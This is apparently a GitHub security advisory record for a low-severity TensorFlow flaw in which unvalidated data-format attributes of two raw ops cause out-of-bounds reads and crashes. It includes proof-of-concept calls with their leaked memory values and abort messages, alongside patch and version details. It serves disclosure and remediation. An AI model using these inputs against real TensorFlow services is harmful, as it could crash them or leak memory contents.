{
    "ghsaId": "GHSA-c9f3-9wfr-wgh7",
    "severity": "LOW",
    "summary": "Lack of validation in data format attributes in TensorFlow",
    "description": "### Impact\nThe `tf.raw_ops.DataFormatVecPermute` API does not validate the `src_format` and `dst_format` attributes. [The code](https://github.com/tensorflow/tensorflow/blob/304b96815324e6a73d046df10df6626d63ac12ad/tensorflow/core/kernels/data_format_ops.cc) assumes that these two arguments define a permutation of `NHWC`.\n\nHowever, these assumptions are not checked and this can result in uninitialized memory accesses, read outside of bounds and even crashes.\n\n```python\n>>> import tensorflow as tf\n>>> tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='1234', dst_format='1234')\n<tf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 757100143], dtype=int32)>\n...\n>>> tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='HHHH', dst_format='WWWW')\n<tf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)>\n...\n>>> tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='H', dst_format='W')\n<tf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)>\n>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], \n                                    src_format='1234', dst_format='1253')\n<tf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 2, 939037184, 3], dtype=int32)>\n...\n>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format='1234', dst_format='1223')\n<tf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 32701, 2, 3], dtype=int32)>\n...\n>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format='1224', dst_format='1423')\n<tf.Tensor: shape=(4,), dtype=int32, numpy=array([1, 4, 3, 32701], dtype=int32)>\n...\n>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], src_format='1234', dst_format='432')\n<tf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 3, 2, 32701], dtype=int32)>\n...\n>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format='12345678', dst_format='87654321')\nmunmap_chunk(): invalid pointer\nAborted\n...\n>>> tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]],           \n                                    src_format='12345678', dst_format='87654321')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[71364624,        0],\n       [71365824,        0],\n       [     560,        0],\n       [      48,        0]], dtype=int32)>\n...\n>>> tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]], \n                                    src_format='12345678', dst_format='87654321')\nfree(): invalid next size (fast)\nAborted\n```\n\nA similar issue occurs in `tf.raw_ops.DataFormatDimMap`, for the same reasons:\n\n```python\n>>> tf.raw_ops.DataFormatDimMap(x=[[1,5],[2,6],[3,7],[4,8]], src_format='1234',\n>>> dst_format='8765')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [1852793632, 1852793632]], dtype=int32)>\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ebc70b7a592420d3d2f359e4b1694c236b82c7ae](https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
    "permalink": "https://github.com/advisories/GHSA-c9f3-9wfr-wgh7",
    "publishedAt": "2020-12-10T19:07:26Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-c9f3-9wfr-wgh7"
        },
        {
            "type": "CVE",
            "value": "CVE-2020-26267"
        }
    ]
}